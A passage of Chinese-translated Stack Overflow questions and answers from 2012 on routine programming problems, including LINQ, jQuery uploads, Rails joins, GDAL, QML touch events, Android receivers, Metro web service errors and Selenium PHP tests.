许多 LINQ 方法，包括`Where`，都使用延迟执行。在这种情况下，您可以将 IEnumerable 视为查询，而不是实际的结果集。通过添加一条`Where`语句，您实际上并没有做任何事情，您只是在查询中添加了一个额外的过滤器，以便稍后，当您实际评估序列时（在这种情况下，当`ToList`被调用时）这些过滤器将全部被应用。

这段代码的意思是，如果`userId`已指定，则在数据上添加一个过滤器，以便仅`userId`包含与该变量匹配的项目。同样的事情也适用于`email`和`lastFourdigits`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:12:13.633

这是`Linq`，（在哪里，选择等...）

`=>`这是 lambda 表达式

[IEnumerable](http://msdn.microsoft.com/en-us/library/9eekhta0.aspx)是.Net 中所有可迭代事物的接口

您可以google每个部分以获取详细信息

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-26T14:16:04.843

IEnumerable 是 SearchClass 对象的集合。将其视为列表或数组。

IEnumerable 是一个通用接口，描述了可以枚举的东西（您可以遍历它并查看/检索它的所有元素）。此 IEnumerable 的内容可以是预先生成的，或者是在您尝试迭代“结果”（IEnumerable）时实时/延迟生成的。

接下来的几行是针对这个“结果”列表运行的查询：

```
result = result.Where(u => u.userId == userId); 
```

可能会令人困惑，因为它将查询的返回分配给运行查询的数据。让我们举一个更简单的例子：

```
var myResult= myEnumerableList.Where(u => u.userId == "Yusuf"); 
```

表示“var myResult”包含来自 myEnumerableList 的所有元素，仅当此元素（此处称为“u”）具有等于“Yusuf”的属性 userId

.Net 提供了强大的方法来查询集合/列表/anything_enumerable，并以类似 SQL 的语法呈现

# php - 带有文件上传的Jquery序列化功能

> ID：12603546
> 
> 赞同：-1
> 
> 时间：2012-09-26T14:04:05.353
> 
> 标签：php, javascript, jquery, ajax

我有一个 jquery 函数：

```
$.ajax({
    type: "POST",
    url: "submit.php",
    contentType:'multipart/form-data',
    data: $('#regForm').serialize(),
    dataType: "json", 
```

它的工作完美，但图像和文件不会由此发送。我该如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:08:39.207

您不能直接使用 Ajax 上传文件，但您可以使用隐藏的 iframe，并使用 中的`target="iframe_name"`属性发送表单数据`<form>`，请参阅本教程： http: [//www.coursesweb.net/ajax/upload-images](http://www.coursesweb.net/ajax/upload-images)

# ruby-on-rails - Rails inner join 两条sql语句获取ActiveRecord::Relation

> ID：12603547
> 
> 赞同：1
> 
> 时间：2012-09-26T14:04:06.060
> 
> 标签：ruby-on-rails, activerecord, arel

我有复杂的查询，我想加入自己进行额外的计算。在 sql 我可以做

```
SELECT t1.*, t2.*
FROM (SQL) AS t1
INNER JOIN
(SQL) AS t2
ON t1.num = t2.num - 1 
```

假设 SQL 是我要加入的查询。

如何在 Rails 中使用 ActiveRecord / arel（或其他东西）来获取 ActiveRecord::Relation 并能够在其上使用 where()。

如果我使用 sql 并执行/select_all 执行此操作，我会得到 PG:result 或 hash 并且不能再使用 where memthod。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T14:34:56.103

第一个解决方案是使用 to_sql 方法插入其他查询：

```
Place.select("places.*, communes.*").joins("INNER JOIN (#{
  Commune.where(:id => [1,2,3]).to_sql
}) as communes ON communes.id = places.commune_id") 
```

第二种解决方案是使用 Arel 的[合并](http://asciicasts.com/episodes/215-advanced-queries-in-rails-3)方法：

```
Place.select("places.*, communes.*")
  .joins(:commune)
  .merge(Commune.where(:id => [1,2,3])) 
```

# c# - 我应该在哪里下载最新的 GDAL 二进制文件和工具以在 c# 中编码

> ID：12603548
> 
> 赞同：-2
> 
> 时间：2012-09-26T14:04:07.230
> 
> 标签：c#, gdal

我想在 C# 项目中使用 GDAL 访问地理栅格数据并执行某些操作。有人可以让我知道我应该在哪里下载最新版本的 GDAL 库的最新二进制文件（包括实用程序、csharp dll 和示例数据，如果有的话）。最好大于 GDAL 1.7.0，因为我将使用 gdaldem。

任何其他输入都受到高度赞赏。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T09:20:38.510

这是： http: [//vbkto.dyndns.org :1280/sdk/](http://vbkto.dyndns.org:1280/sdk/)

您也可以使用它：http: [//gdal2tilescsharp.codeplex.com/](http://gdal2tilescsharp.codeplex.com/)

但我更喜欢第一个。对我来说很好:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-29T12:25:29.573

您可以使用链接下载。 [http://trac.osgeo.org/gdal/wiki/DownloadingGdalBinaries](http://trac.osgeo.org/gdal/wiki/DownloadingGdalBinaries)

另外，如果您想编译，可以使用此链接。[https://trac.osgeo.org/gdal/wiki/GdalOgrCsharpCompile](https://trac.osgeo.org/gdal/wiki/GdalOgrCsharpCompile)

此链接描述了从源创建 GDAL/OGR C# 二进制文件时的主要步骤。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-07-13T17:43:05.203

这是使用 .Net Core 的最新版本。 [https://www.nuget.org/packages/Gdal.Core/](https://www.nuget.org/packages/Gdal.Core/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-10-23T14:53:16.063

[您可以在http://www.gisinternals.com/](http://www.gisinternals.com/)找到已编译的二进制文件

只需添加对 \bin\gdal\csharp*_csharp.dll 的引用，将 *_wrap.dll 添加到您的输出位置和其他 gdal dll。

# qt - QML 信号执行两次

> ID：12603551
> 
> 赞同：6
> 
> 时间：2012-09-26T14:04:10.300
> 
> 标签：qt, qml, blackberry-10, qt-signals

我是 QML 和 QML 信号的新手，我遇到了这个我自己无法解决的愚蠢问题。我正在触发一个`onTouch`信号并执行了两次，产生了双重响应，导致我的应用程序崩溃。

这是我的 QML 代码：

> //LabelKey.qml
> 
> ```
> import bb.cascades 1.0
> 
> Container {
> 
>     property string labelText: "#"
>     property real width: 153.3
>     property real height: 102.5
>     property int labelPosX: 60
>     property int labelPosY: 25
>     property int labelTextFontWidth: 45
>     property string imgSrc: "asset:///images/keyboard_button.png"
> 
>     layout: AbsoluteLayout {
>     }
>     preferredWidth: width
>     preferredHeight: height
>     objectName: "contTecla"
>     id: contTecla
>     ImageView {
>         objectName: "imgTecla"
>         id: imgTecla1
>         imageSource: imgSrc
>         preferredWidth: width
>         preferredHeight: height
>         onTouch: {
>             textFieldKey.text = textFieldKey.text + labelTecla.text;
>         }
>     }
>     Label {
>         objectName: "labelTecla"
>         id: labelTecla
>         text: labelText
>         textStyle {
>             color: Color.DarkYellow
>             size: labelTextFontWidth
>         }
>         layoutProperties: AbsoluteLayoutProperties {
>             positionX: labelPosX
>             positionY: labelPosY
>         }
>     } 
> } 
> ```

我有这个`TextField`，它的 id`textFieldKey`在另一个 QML 中，其中包括我在上面发布的那个。主要思想很简单，是一个键盘，其中每个键都是上面代码的一个组件，它必须打印在 this 中按下的键的值`TextField`。

问题是，正如我所说，信号被调用了两次，`TextField`每次都用两个字符填充值。

请帮助我，我不知道我是否以正确的方式使用信号或类似的东西遗漏了一些东西。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T13:12:37.257

我想通了。触摸信号有 4 种不同的状态：

*   Down：当用户触摸屏幕时发生。

*   移动：当用户在屏幕上移动手指时发生。

*   Up：当用户松开手指时发生。

*   取消：取消交互时发生。

每个人都用一个从 0 到 3 的数字来标识。

当触发触摸信号时，会涉及两种状态，向下和向上。你只需要确定你想要使用的那个并在 onTouch 信号中捕获它：

```
if (event.touchType == numberOfTheTouchState){
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T17:29:28.440

你想用

```
ImageView
{
    objectName: "imgTecla"
    id: imgTecla1
    imageSource: imgSrc
    preferredWidth: width
    preferredHeight: height
    onTouch:
    {
        if(event.isDown())
        {
            textFieldKey.text = textFieldKey.text + labelTecla.text;
        }
    }
} 
```

如前所述，没有这个，你会得到 up 和 down 事件

# android - Android - 异步异常“字符 0 处的输入结束”

> ID：12603552
> 
> 赞同：0
> 
> 时间：2012-09-26T14:04:10.880
> 
> 标签：android, android-asynctask

我正在进行异步服务器调用，并且每隔一段时间就会生成此异常：

```
End of input at character 0 of 
```

我在这里：

```
 @Override
    protected String doInBackground(String... theParams) 
    {
        String myUrl = theParams[0];
        final String user_id = theParams[1];

        String charset = "UTF-8";           
        String response = null;

        try 
        {                           
            String query = String.format("user_id=%s", 
                     URLEncoder.encode( user_id, charset) );

            final URL url = new URL( myUrl + "?" + query );

            final HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            conn.setDoOutput(true); 
            conn.setRequestMethod("POST");

            conn.setDoOutput(true);
            conn.setUseCaches(false);

            conn.connect();

            final InputStream is = conn.getInputStream();
            final byte[] buffer = new byte[8196];
            int readCount;
            final StringBuilder builder = new StringBuilder();
            while ((readCount = is.read(buffer)) > -1) 
            {
                builder.append(new String(buffer, 0, readCount));
            }

            response = builder.toString();      
        } 
        catch (Exception e) 
        {
                 e.getMessage());
        }} 
```

有谁知道为什么会生成它？只是服务器没有响应吗？或者是其他东西？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T14:12:30.117

这个问题以前有人问过。

您确定您没有向期望 GET 的 url 发出 POST 请求吗？尝试将该 requestMethod 更改为 GET 并查看它是如何进行的。

检查这个问题：

[org.json.JSON 异常：字符 0 处的输入结束](https://stackoverflow.com/questions/8202048/org-json-json-exception-end-of-input-at-character-0)

# android - 用于监控互联网连接的广播接收器不起作用

> ID：12603559
> 
> 赞同：0
> 
> 时间：2012-09-26T14:04:32.660
> 
> 标签：android, broadcastreceiver

我正在尝试制作广播接收器来监听互联网连接，然后在连接时执行一些任务。

当我在我的真实设备上禁用或启用我的 WIFI 或禁用/启用模拟器中的数据访问时，我没有收到任何通知。不再支持操作 CONNECTIVITY_CHANGE。

```
 public class InternetConnectivityReceiver extends BroadcastReceiver {
Context context;
@Override
public void onReceive(Context context, Intent intent) {
    this.context = context;

    Log.i(TAG, "Internet Conenction State Changed");
}
} 
```

显现

```
 <application
    android:icon="@android:drawable/arrow_down_float"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" >

      <receiver android:name=".InternetConnectivityReceiver">
            <intent-filter>
                <action android:name="android.net.conn.BACKGROUND_DATA_SETTING_CHANGED">

                </action>
            </intent-filter>
        </receiver>
......
</application> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T15:00:43.170

[开发人员文档`ConnectivityManager`](http://developer.android.com/reference/android/net/ConnectivityManager.html)说：

> **Background_DATA_SETTING_CHANGED**
> 
> 此常量已弃用。从 ICE_CREAM_SANDWICH 开始，背景数据的可用性取决于几个综合因素，并且不再发送此广播。

试着听一下`"android.net.conn.CONNECTIVITY_CHANGE"`。

# c# - pdf 来自从 excel 文件中提取的数据集

> ID：12603563
> 
> 赞同：0
> 
> 时间：2012-09-26T14:04:46.780
> 
> 标签：c#, asp.net

我有一个通过读取 excel 文件生成的数据集。有没有办法在不使用任何外部 dll 的情况下从数据集中生成 pdf？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T14:18:14.927

没有这样做的本机方法，但使用 iTextSharp 非常容易，看看[http://www.codeproject.com/Questions/386996/How-to-export-datatable-to-PDF-using-Csharp-window](http://www.codeproject.com/Questions/386996/How-to-export-datatable-to-PDF-using-Csharp-window)

# java - 初始化 Metro Web 服务客户端时出错

> ID：12603564
> 
> 赞同：1
> 
> 时间：2012-09-26T14:04:53.267
> 
> 标签：java, jakarta-ee, java-metro-framework, securityexception, ibm-jdk

几周以来，我们的外部测试环境（不是我们运营的）出现了一些问题。我们的网络应用程序连接到一个肥皂网络服务。

**我们正在使用：**

*   **用于 web 服务客户端的**metro 2.1.1****
***   **测试环境安装**java-1.5.0-ibm-1.5.0.12.4 。*******   **Tomcat版本：5.5.27******

 ****第一次尝试在此环境中初始化客户端时，我们收到以下异常（仅在此环境中）：

```
java.lang.ExceptionInInitializerError
    at java.lang.J9VMInternals.initialize(J9VMInternals.java:218)
    at javax.xml.ws.Service.<init>(Service.java:57)
    at com.xxx.xxx.xxx.xxxy.client.MyServiceRequestProvider_Service.<init>(MyServiceRequestProvider_Service.java:50)
    at com.xxx.xxx.client.MyServiceRequester.<init>(MyServiceRequester.java:63)
    at com.xxx.xxx.action.CheckAction.execute(CheckAction.java:120)
    at com.xxx.xxx.webservice.validators.ApplicationValidatorImpl.validateCheck(ApplicationValidatorImpl.java:403)
    at com.xxx.xxx.webservice.validators.ApplicationValidatorImpl$$EnhancerByGuice$$55e5e7ad.CGLIB$validateCheck$6(<generated>)
    at com.xxx.xxx.webservice.validators.ApplicationValidatorImpl$$EnhancerByGuice$$55e5e7ad$$FastClassByGuice$$380e5720.invoke(<generated>)
    at com.google.inject.cglib.proxy.MethodProxy.invokeSuper(MethodProxy.java:187)
    at com.google.inject.InterceptorStackCallback$InterceptedMethodInvocation.proceed(InterceptorStackCallback.java:66)
    at com.xxx.xxx.webservice.guice.interceptor.ValidationErrorInterceptor.invoke(ValidationErrorInterceptor.java:21)
    at com.google.inject.InterceptorStackCallback$InterceptedMethodInvocation.proceed(InterceptorStackCallback.java:66)
    at com.xxx.xxx.webservice.guice.interceptor.PersistenzInterceptor.invoke(PersistenzInterceptor.java:35)
    at com.google.inject.InterceptorStackCallback$InterceptedMethodInvocation.proceed(InterceptorStackCallback.java:66)
    at com.google.inject.InterceptorStackCallback.intercept(InterceptorStackCallback.java:45)
    at com.xxx.xxx.webservice.validators.ApplicationValidatorImpl$$EnhancerByGuice$$55e5e7ad.validateCheck(<generated>)
    at com.xxx.xxx.webservice.endpoint.xxxWS.order(xxxWS.java:99)
    at com.xxx.xxx.webservice.endpoint.xxxWS$$EnhancerByGuice$$3bd5ffaf.CGLIB$order$1(<generated>)
    at com.xxx.xxx.webservice.endpoint.xxxWS$$EnhancerByGuice$$3bd5ffaf$$FastClassByGuice$$806bc0a0.invoke(<generated>)
    at com.google.inject.cglib.proxy.MethodProxy.invokeSuper(MethodProxy.java:187)
    at com.google.inject.InterceptorStackCallback$InterceptedMethodInvocation.proceed(InterceptorStackCallback.java:66)
    at com.xxx.xxx.webservice.guice.interceptor.RsvAgeManipulatorInterceptor.invoke(RsvAgeManipulatorInterceptor.java:95)
    at com.google.inject.InterceptorStackCallback$InterceptedMethodInvocation.proceed(InterceptorStackCallback.java:66)
    at com.xxx.xxx.webservice.guice.interceptor.ValueConverterInterceptor.invoke(ValueConverterInterceptor.java:101)
    at com.google.inject.InterceptorStackCallback$InterceptedMethodInvocation.proceed(InterceptorStackCallback.java:66)
    at com.xxx.xxx.webservice.guice.interceptor.DataValidationInterceptor.invoke(DataValidationInterceptor.java:31)
    at com.google.inject.InterceptorStackCallback$InterceptedMethodInvocation.proceed(InterceptorStackCallback.java:66)
    at com.xxx.xxx.webservice.guice.interceptor.UserValidationInterceptor.invoke(UserValidationInterceptor.java:36)
    at com.google.inject.InterceptorStackCallback$InterceptedMethodInvocation.proceed(InterceptorStackCallback.java:66)
    at com.xxx.xxx.webservice.guice.interceptor.SessionInitializerInterceptor.invoke(SessionInitializerInterceptor.java:65)
    at com.google.inject.InterceptorStackCallback$InterceptedMethodInvocation.proceed(InterceptorStackCallback.java:66)
    at com.google.inject.InterceptorStackCallback.intercept(InterceptorStackCallback.java:45)
    at com.xxx.xxx.webservice.endpoint.xxxWS$$EnhancerByGuice$$3bd5ffaf.order(<generated>)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:79)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:618)
    at com.sun.xml.ws.api.server.InstanceResolver$1.invoke(InstanceResolver.java:250)
    at com.sun.xml.ws.server.InvokerTube$2.invoke(InvokerTube.java:150)
    at com.sun.xml.ws.server.sei.EndpointMethodHandler.invoke(EndpointMethodHandler.java:261)
    at com.sun.xml.ws.server.sei.SEIInvokerTube.processRequest(SEIInvokerTube.java:100)
    at com.sun.xml.ws.api.pipe.Fiber.__doRun(Fiber.java:641)
    at com.sun.xml.ws.api.pipe.Fiber._doRun(Fiber.java:600)
    at com.sun.xml.ws.api.pipe.Fiber.doRun(Fiber.java:585)
    at com.sun.xml.ws.api.pipe.Fiber.runSync(Fiber.java:482)
    at com.sun.xml.ws.server.WSEndpointImpl$2.process(WSEndpointImpl.java:314)
    at com.sun.xml.ws.transport.http.HttpAdapter$HttpToolkit.handle(HttpAdapter.java:608)
    at com.sun.xml.ws.transport.http.HttpAdapter.handle(HttpAdapter.java:259)
    at com.sun.xml.ws.transport.http.servlet.ServletAdapter.invokeAsync(ServletAdapter.java:207)
    at com.sun.xml.ws.transport.http.servlet.WSServletDelegate.doGet(WSServletDelegate.java:159)
    at com.sun.xml.ws.transport.http.servlet.WSServletDelegate.doPost(WSServletDelegate.java:194)
    at com.sun.xml.ws.transport.http.servlet.WSServlet.doPost(WSServlet.java:80)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:710)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:803)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:269)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:188)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:210)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:172)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:117)
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:108)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:151)
    at org.apache.jk.server.JkCoyoteHandler.invoke(JkCoyoteHandler.java:200)
    at org.apache.jk.common.HandlerRequest.invoke(HandlerRequest.java:291)
    at org.apache.jk.common.ChannelSocket.invoke(ChannelSocket.java:775)
    at org.apache.jk.common.ChannelSocket.processConnection(ChannelSocket.java:704)
    at org.apache.jk.common.ChannelSocket$SocketConnection.runIt(ChannelSocket.java:897)
    at org.apache.tomcat.util.threads.ThreadPool$ControlRunnable.run(ThreadPool.java:685)
    at java.lang.Thread.run(Thread.java:811)
Caused by: java.lang.SecurityException: java.util.ServiceLoader - protected system package 'java.util'
    at java.lang.ClassLoader.checkClassName(ClassLoader.java:213)
    at java.lang.ClassLoader.defineClass(ClassLoader.java:255)
    at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:151)
    at java.net.URLClassLoader.defineClass(URLClassLoader.java:600)
    at java.net.URLClassLoader.access$400(URLClassLoader.java:124)
    at java.net.URLClassLoader$ClassFinder.run(URLClassLoader.java:1055)
    at java.security.AccessController.doPrivileged(AccessController.java:274)
    at java.net.URLClassLoader.findClass(URLClassLoader.java:492)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:640)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:632)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:606)
    at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1346)
    at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1205)
    at java.lang.Class.forNameImpl(Native Method)
    at java.lang.Class.forName(Class.java:130)
    at javax.xml.ws.spi.Provider.<clinit>(Provider.java:55)
    at java.lang.J9VMInternals.initializeImpl(Native Method)
    at java.lang.J9VMInternals.initialize(J9VMInternals.java:196)
    ... 68 more 
```

进一步尝试初始化此客户端会导致：

```
2012-09-26 11:34:56,016 ERROR [TP-Processor7] com.xxx.xxx.client.MyServiceRequester#<init>(65): Error initialising MyServiceRequestProvider_Service
java.lang.NoClassDefFoundError: javax.xml.ws.spi.Provider (initialization failure)
at java.lang.J9VMInternals.initialize(J9VMInternals.java:134)
at javax.xml.ws.Service.<init>(Service.java:57)
... 
```

Metro Provider 类中似乎存在一些安全问题。我认为metro的javax.xml.ws.spi.Provider类的以下片段是失败的根源：

```
static {
Method tLoadMethod = null;
Method tIteratorMethod = null;
try {
    Class<?> clazz = Class.forName("java.util.ServiceLoader");
    tLoadMethod = clazz.getMethod("load", Class.class);
    tIteratorMethod = clazz.getMethod("iterator");
} catch(ClassNotFoundException ce) {
    // Running on Java SE 5
} catch(NoSuchMethodException ne) {
   // Shouldn't happen
}
loadMethod = tLoadMethod;
iteratorMethod = tIteratorMethod; 
```

}

似乎 Classloader 没有抛出 ClassNotFoundException，而是抛出了一个 SecurityException，静态初始化程序没有捕获到它。

这种行为的原因可能是什么（某些策略设置？）以及我们如何防止这种情况发生。该应用程序在我们的本地测试环境中运行，并且也在外部环境中运行。外部提供者否认环境的任何改变。这种行为是 IBM-JDK 特有的吗？

**编辑：**

我在 JDK 5.0 API 类 java.security.SecureClassLoader 中找到了以下内容：

> SecurityException - 如果尝试将此类添加到包含由与此类不同的证书集签名的类的包中，或者如果类名以“java.”开头。

但是这种情况不会发生在所有运行在 tomcat 上的 Metro 客户端吗？

**编辑：**

非常感谢您的建议！类路径中实际上有一个 JDK 1.6 rt.jar 的路径。因此找到了 ServiceLoader 类，但不允许在 Provider 中加载。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-21T11:03:32.643

感谢肖恩，

类路径中实际上存在 JDK 1.6 rt.jar 的路径。因此找到了 ServiceLoader 类，但不允许在 Provider 中加载。****

# jquery - 将数组传递给预先输入的 Bootstrap

> ID：12603567
> 
> 赞同：5
> 
> 时间：2012-09-26T14:05:01.007
> 
> 标签：jquery, arrays, json, twitter-bootstrap

我正在尝试通过 json 将一组值传递给`source:`Bootstrap 的 Typeahead 插件选项。

这是我的简单代码：**[JsFiddle](http://jsfiddle.net/toroncino/CKCJb/)**

我有一个**JSON**对象，我只想将值 id 传递给`source: array`

我做错了什么......我尝试了很多事情。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-26T14:10:53.513

Twitter 的 typeahead 需要一个 Javascript 数组类型。因此，您需要使用`JSON.parse(myJSONObject)`. 但是，预输入也需要一个字符串数组，而不是数组数组......所以，问题是 - 您要在预输入中显示这些数组的哪个参数？

```
{
    "id":"2",
    "pid":"0",
    "type":"Group",
    "code":"g",
    "status":"1"
} 
```

看起来您的`vals`函数正在隔离`id`参数。如果这是您希望预先输入显示的参数，只需`source`指向`x`. 签出这个修改后的 jsFiddle：

*   [http://jsfiddle.net/365Sf/](http://jsfiddle.net/365Sf/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-10-10T22:53:07.143

也有为此目的的**当地财产。**

您可以在 typeahead 中使用**本地属性来提供数组，而无需处理数据。**

例如

```
var data = ["john", "terry", "phil","stuart","louis","marie","bob"];

$("#user-search").typeahead({
   name: "user-search",
   local: data,
   limit: 10
}); 
```

# ios - 我可以将 iAd ADBannerView 放置在 iPad 应用程序的中间吗？

> ID：12603569
> 
> 赞同：1
> 
> 时间：2012-09-26T14:05:06.107
> 
> 标签：ios, ipad, iad

我可以将 iAd ADBannerView 作为视图的子视图，它位于屏幕中间。因此，广告视图将有效地位于 ipad 应用程序的中间。我没有更改 ADBannerView 的大小。我的问题是

1、苹果会拒绝我的应用吗？

2、我的ADBannerView可以接收来自iAd网络的广告吗？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T14:11:18.317

你应该试试看。打开您的应用程序后，您会看到一个测试广告，如果您点击它，它会告诉您它是否工作正常。

否则，三是我所知道的关于广告位置的规则，你可以把它放在任何你喜欢的地方，中间就可以了。

# android - 未从 CustomAdapter 设置 ListView 中的 TextView

> ID：12603571
> 
> 赞同：0
> 
> 时间：2012-09-26T14:05:31.783
> 
> 标签：android, listview, adapter

我有一个应用程序以数组的形式从 Web 服务中检索数据。在适配器的 getView() 中，我将 TextViews 设置为数组中的元素。该数组称为recordItem，并具有各种元素，其中之一是“状态”。Status 是一个可以完成、ncr 或等待的字符串。如果我直接在 listview 中设置 TextView 并使用完成的值，ncr 或等待没有问题。

我不想在 textview 中显示完整的字符串，而是显示 C、NCR 或 W。我有一系列“if 语句”来检查数组元素，然后将 textview 设置为相应的字符。

问题是没有显示任何字符。为什么？

```
@Override
        public View getView(int position, View convertView, ViewGroup parent) {

            LayoutInflater inflater = (LayoutInflater) context
                    .getSystemService(Context.LAYOUT_INFLATER_SERVICE);

            View rowView = inflater.inflate(R.layout.rotarowlayout, parent,
                    false);

            TextView startTime = (TextView) rowView
                    .findViewById(R.id.rowstarttime);
            TextView duration = (TextView) rowView
                    .findViewById(R.id.rowduration);
            TextView status = (TextView) rowView.findViewById(R.id.rowstatus);
            TextView name = (TextView) rowView.findViewById(R.id.rowclientname);

            String record = list.get(position).toString();
            String[] itemsInRecord = record.split(",");
            Log.e(TAG, "itemin record = " + itemsInRecord.length);
            String[] recordItem = new String[itemsInRecord.length];

            for (int x = 0; x < itemsInRecord.length; x++) {

                recordItem[x] = itemsInRecord[x];
                Log.e(TAG, "x = " + x);
            }

            String withoutBraket = recordItem[0].substring(11);
            String withoutSecs = withoutBraket.substring(0, 6);

            Log.e(TAG, "recordItem = " + recordItem[2]);

            if(recordItem[2].toString().equalsIgnoreCase("Completed")){

                statusField = "c";

            }else if(recordItem[2].toString().equalsIgnoreCase("NCR")){

                statusField = "NCR";

            }else if(recordItem[2].toString().equalsIgnoreCase("Waiting")){

                statusField = "W";
            }

            Log.e(TAG, "statusField = " + statusField);

            startTime.setText(withoutSecs );
            duration.setText( recordItem[1]);
            status.setText( statusField);
            name.setText( recordItem[3] + recordItem[4]);
            callID = recordItem[5];
            needName = recordItem[6];

            return rowView;

        } 
```

.

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical" >

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:paddingTop="5dp" >

        <TextView
            android:id="@+id/rowstarttime"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_weight="1" />

        <TextView
            android:id="@+id/rowduration"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content" />
    </LinearLayout>

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:paddingBottom="10dp" >

        <TextView
            android:id="@+id/rowstatus"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_weight="1" />

        <TextView
            android:id="@+id/rowclientname"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content" />
    </LinearLayout>

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T14:29:42.553

recordItem[2] 需要 trim() 调用它。.equals 因此不拿起琴弦。

# php - 如何使用 selenium php 发送电子邮件

> ID：12603577
> 
> 赞同：0
> 
> 时间：2012-09-26T14:05:49.380
> 
> 标签：php, selenium, phpunit, selenium-rc

**大家好**，

我想知道是否有人知道如何从 selenium/php 的测试中发送电子邮件我正在尝试这样做：

```
<?php

class Example extends PHPUnit_Extensions_SeleniumTestCase
{
  protected function setUp()
  {
    $this->setBrowser("chrome");
    $this->setBrowserUrl("http://recette2011.thalys.com/");
    $this->setSpeed(500);
  }

  public function testMyTestCase()
  {
    $this->open("/be/en");
    $this->click("link=Help");
    $this->waitForPageToLoad("30000");
    $this->click("id=multi_block_title_span_element_2");
    $this->click("id=demande_information");
    $this->click("id=type_billet_information_aucun");
    $this->click("id=btn_valider");
    $this->waitForPageToLoad("30000");
    $url = $this->getLocation();
    echo $url;
    $cpt = substr_count ($url, "&");
    if($cpt >3){
        if(mail('ths@bytesandcom.be','Test',"Le test a foiré"))
        {
            echo "message sent";
        }
        else
        {
            echo "sent message failed";
        }
        echo "test failed";
    }
    else
    {
        echo "Test Granted";
    }
  }

} 
```

当我进入“ if($cpt >3)”时，我的服务器告诉我：传递给 PHPUnit_Framework_Error::__construct() 的参数 5 必须是异常的实例，给定数组，在 C:\wamp\bin\ 中调用php\php5.3.5\PEAR\PHPUnit\Exten sions\SeleniumTestCase.php 在第 1152 行并定义

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T10:55:40.210

我发现了如何在发生错误时编写日志文件，并且我创建了一个 Cron 来通过检查文件是否存在来发送电子邮件

这是我的代码：

```
<?php

class Example extends PHPUnit_Extensions_SeleniumTestCase
{
  protected function setUp()
  {
    $this->setBrowser("*firefox");
    $this->setBrowserUrl("http://recette2011.thalys.com/");
    $this->setSpeed(500);
  }

  public function testMyTestCase()
  {
      $this->open("/be/en");
      $this->click("link=Help");
      $this->waitForPageToLoad("30000");
      $this->click("id=multi_block_title_span_element_2");
      $this->click("id=demande_information");
      $this->click("id=type_billet_information_aucun");
      $this->click("id=btn_valider");
      $this->waitForPageToLoad("30000");
      $url = $this->getLocation();
      echo $url;
      $cpt = substr_count ($url, "&");
      if($cpt >3){
         $date = date("d-m-Y");
         $heure = date("H:i");
         $monfichier = fopen('C:\Users\intégrateur\Desktop\testSelenium\logSelenium.txt', 'a+');
         fputs($monfichier, '-- Probleme dans le fichier PasBillet.php le '.$date.' a '.$heure.' -- ');
         fclose($monfichier);
      }
      else
      {
          echo "Test Granted";
      }
   }

}
?> 
```

而 Cron 是：

```
<?php
$file = "C:\Users\intégrateur\Desktop\testSelenium\logSelenium.txt";
if(file_exists($file))
{
    if(filesize($file)>0)
    {
        mail('ths@bytesandcom.be','Probleme selenium','Une erreur est survenue dans un test de formaulaire. Pour plus d\'info consulter le fichier logSelenium.txt');
    } 
}
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T16:31:49.777

我认为这是由于我通过使用作曲家`PHPUnit 3.7.1.`
下载解决了它的向后兼容中断。`phpunit/phpunit-selenium`

# javascript - 如何防止 IE 显示网站？

> ID：12603578
> 
